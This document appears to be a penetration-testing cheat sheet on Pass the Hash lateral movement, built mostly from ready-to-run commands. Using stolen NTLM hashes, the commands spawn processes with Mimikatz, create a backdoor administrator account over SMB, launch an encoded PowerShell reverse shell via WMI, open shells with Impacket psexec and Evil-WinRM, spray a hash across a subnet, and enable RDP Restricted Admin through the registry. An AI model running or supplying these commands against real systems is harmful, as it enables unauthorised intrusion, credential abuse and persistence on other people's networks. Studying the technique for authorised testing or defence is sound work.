# Pass the Hash (PtH) Lateral Movement

**Pass the Hash (PtH)** is a technique where an attacker authenticates using a user's **password hash** instead of the plaintext password. This works because **NTLM hashes** remain static for every session until the password is changed and are not "salted" when stored on servers or Domain Controllers.

### Prerequisites for PtH

- **Administrative privileges** (or specific rights) on the machine where you are extracting the hash.
- The target account must have **administrative rights** on the destination computer.

---

## Windows Methodology

### 1. Mimikatz (sekurlsa::pth)

Use this technique when you have local admin access on a Windows host and want to **spawn a new process** (like `cmd.exe`) in the context of another user using their hash.

**Workflow:**

1. Launch Mimikatz with **debug privileges**.
2. Execute the `sekurlsa::pth` module to start a process.
3. Interact with the new process to access remote resources.

|Parameter|Description|
|:--|:--|
|`/user`|The username of the account to impersonate|
|`/domain`|The FQDN of the target domain|
|`/rc4`|The NTLM hash of the user's password|
|`/run`|The program to execute (typically `cmd.exe`)|

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:<USERNAME> /rc4:<NTLM_HASH> /domain:<DOMAIN> /run:cmd.exe" exit
```

### 2. Invoke-TheHash (PowerShell)

This tool allows PtH attacks via **WMI or SMB** using the .NET TCPClient. **Local administrator privileges are not required** on the client-side to run this tool.

**Workflow:**

1. Import the PowerShell module.
2. Choose a method (SMB for service creation/WMI for process execution).
3. Specify the target and command to execute.

|Method|Use Case|
|:--|:--|
|**Invoke-SMBExec**|Executes commands by creating a temporary service on the target.|
|**Invoke-WMIExec**|Executes commands via the WMI interface.|

```
# Method 1: SMB - Create a new administrator
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <TARGET_IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLM_HASH> -Command "net user <USERNAME> <PASSWORD> /add && net localgroup administrators <USERNAME> /add" -Verbose

# Method 2: WMI - Execute a Base64 encoded PowerShell reverse shell
Invoke-WMIExec -Target <TARGET_IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLM_HASH> -Command "powershell -e <BASE64_PAYLOAD>"
```

---

## Linux Methodology

### 1. Impacket PsExec

Use this for quick **interactive command execution** from a Linux attack machine. It creates a service on the target to provide a shell.

```
impacket-psexec <USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>
```

### 2. NetExec (Lateral Movement & Spraying)

Use this to **automate** authentication across a subnet. It is ideal for identifying where a specific hash has administrative rights (marked as `(Pwn3d!)`) due to password reuse.

**Scenario:** Checking for local administrator password reuse across a network range using a dumped SAM hash.

|Option|Description|
|:--|:--|
|`--local-auth`|Authenticates using local accounts instead of domain accounts.|
|`-x`|Executes a specific command on the target(s).|

```
# Spraying a hash across a subnet to check for local admin access
netexec smb <TARGET_IP>/24 -u <USERNAME> -d . -H <NTLM_HASH> --local-auth

# Executing a command on a specific host
netexec smb <TARGET_IP> -u <USERNAME> -d <DOMAIN> -H <NTLM_HASH> -x <COMMAND>
```

### 3. Evil-WinRM

Use this protocol when **SMB is blocked** or if you do not have full administrative rights but have **WinRM** access.

```
evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTLM_HASH>
```

### 4. RDP (GUI Access)

Use `xfreerdp` when you require a **graphical interface**. This requires the target to have **Restricted Admin Mode** enabled.

**Workflow:**

1. Enable Restricted Admin Mode on the target via the registry if not already active.
2. Connect using the `/pth` flag.

```
# Step 1: Enable Restricted Admin Mode (must be run on target)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Step 2: Connect from Linux
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /pth:<NTLM_HASH>
```

---

## Technical Restrictions & Misconfigurations

|Registry Key|Value|Impact on PtH|
|:--|:--|:--|
|**DisableRestrictedAdmin**|`0`|**Enables** RDP Pass the Hash.|
|**LocalAccountTokenFilterPolicy**|`0`|Only the **RID-500** "Administrator" account can perform remote PtH.|
|**LocalAccountTokenFilterPolicy**|`1`|**All** local administrative accounts can perform remote PtH.|
|**FilterAdministratorToken**|`1`|**Blocks** remote PtH even for the RID-500 account.|

**Note on UAC:** These restrictions primarily affect **local accounts**. If you have a **domain account** with administrative rights, PtH generally works regardless of these local registry settings.